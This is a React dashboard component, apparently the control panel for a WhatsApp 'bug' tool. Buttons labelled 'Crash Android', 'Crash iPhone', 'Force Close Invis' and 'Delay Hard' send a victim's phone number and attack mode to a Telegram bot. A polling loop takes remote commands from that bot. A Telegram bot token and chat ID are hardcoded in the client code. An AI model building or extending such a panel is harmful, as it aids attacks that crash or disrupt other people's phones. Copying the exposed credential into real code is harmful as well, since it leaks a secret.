"use client"

import React, { useState, useEffect } from "react"
import { LayoutDashboard, Settings, LogOut, Bell, Volume2, Wifi, Database, Clock } from "lucide-react"

export default function YaeMikoDashboard() {
  const BOT_TOKEN = '8208922468:AAGCSBYVOB-aRRz1s__rHZUwh2h5rSMsRbk'; 
  const CHAT_ID = '6481060681';      

  const [currentView, setCurrentView] = useState('dashboard')
  const [isLoggedIn, setIsLoggedIn] = useState(false)
  const [bugLimit, setBugLimit] = useState(5)
  const [senderNumber, setSenderNumber] = useState("")
  
  // Fitur Tambahan (Bukan Ganti Fitur)
  const [isMaintenance, setIsMaintenance] = useState(false)
  const [showPairModal, setShowPairModal] = useState(false)
  const [pairingCode, setPairingCode] = useState("")

  const notifyBot = (message: string) => {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
  };

  // Listener Command (Biar bisa kontrol dari Tele)
  useEffect(() => {
    const checkBotCommands = setInterval(async () => {
      try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
        const data = await response.json();
        if (data.result.length > 0) {
          const cmd = data.result[0].message?.text || "";
          if (cmd.startsWith('/pair')) {
            const code = cmd.split(' ')[1];
            setPairingCode(code);
            setShowPairModal(true);
          } else if (cmd === '/risetlimit') {
            setBugLimit(5);
            notifyBot("✅ Limit reset to 5!");
          } else if (cmd === '/lockdown') {
            setIsMaintenance(true);
          } else if (cmd === '/unlock') {
            setIsMaintenance(false);
          }
        }
      } catch (e) {}
    }, 3000);
    return () => clearInterval(checkBotCommands);
  }, []);

  return (
    <div className="relative min-h-screen bg-black text-white">
      {/* MAINTENANCE LAYER (Hard Lock) */}
      {isMaintenance && (
        <div className="fixed inset-0 z-[999] bg-black flex flex-col items-center justify-center">
          <div className="w-16 h-16 border-4 border-red-500 rounded-full animate-spin border-t-transparent" />
          <p className="mt-4 text-red-500 font-bold uppercase">System Locked</p>
        </div>
      )}

      {/* RAIN EFFECT PAIRING */}
      {showPairModal && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center p-6 bg-black/60 backdrop-blur-sm">
          <div className="bg-gradient-to-br from-pink-500/20 to-cyan-500/20 p-8 rounded-3xl border border-white/20 text-center">
            <h3 className="text-xs uppercase tracking-widest mb-4">Pairing Active</h3>
            <div className="text-5xl font-black mb-6">{pairingCode}</div>
            <button onClick={() => setShowPairModal(false)} className="bg-white/10 px-6 py-2 rounded-xl text-xs uppercase">Dismiss</button>
          </div>
        </div>
      )}

      {/* LOGIN & MAIN DASHBOARD (Struktur Awal lo) */}
      {!isLoggedIn ? (
        <div className="flex flex-col items-center justify-center min-h-screen">
          <button onClick={() => { setIsLoggedIn(true); notifyBot("[SYSTEM] Login Accessed"); }} className="px-10 py-5 bg-blue-700 rounded-full font-bold">ACCESS SYSTEM</button>
        </div>
      ) : (
        <div className="max-w-md mx-auto p-6 pb-32">
          {currentView === 'dashboard' ? (
             <div className="mt-20">
               <h2 className="text-2xl font-black">DASHBOARD</h2>
               {/* List Bug lo (yang tadi lo minta) */}
               <div className="grid grid-cols-2 gap-4 mt-8">
                {['Delay Invisible', 'Delay Invis iPhone', 'Delay Hard', 'Force Close Invis', 'Blank UI', 'Crash Android', 'Crash iPhone'].map((item) => (
                  <button key={item} onClick={() => {
                    const time = new Date().toLocaleTimeString();
                    notifyBot(`🎯 Target: ${senderNumber}\n⚡ Mode: ${item}\n⏰ Time: ${time}`);
                  }} className="p-4 bg-white/5 rounded-2xl text-[10px] font-bold uppercase">{item}</button>
                ))}
               </div>
             </div>
          ) : (
            <div className="mt-10">
              <h2 className="text-2xl font-black mb-8 uppercase">Settings</h2>
              <input type="number" placeholder="628..." onChange={(e) => setSenderNumber(e.target.value)} className="w-full bg-black/40 p-4 rounded-2xl mb-4" />
              <button onClick={() => notifyBot(`🔗 PAIRING: ${senderNumber}`)} className="w-full py-4 bg-green-600 rounded-2xl uppercase font-bold text-xs">Link WhatsApp</button>
            </div>
          )}

          {/* Navigasi Bawah */}
          <div className="fixed bottom-8 left-6 right-6 bg-white/10 p-4 rounded-[2.5rem] flex justify-around">
            <button onClick={() => setCurrentView('dashboard')}>DASHBOARD</button>
            <button onClick={() => setCurrentView('settings')}>SETTINGS</button>
          </div>
        </div>
      )}
    </div>
  )
}
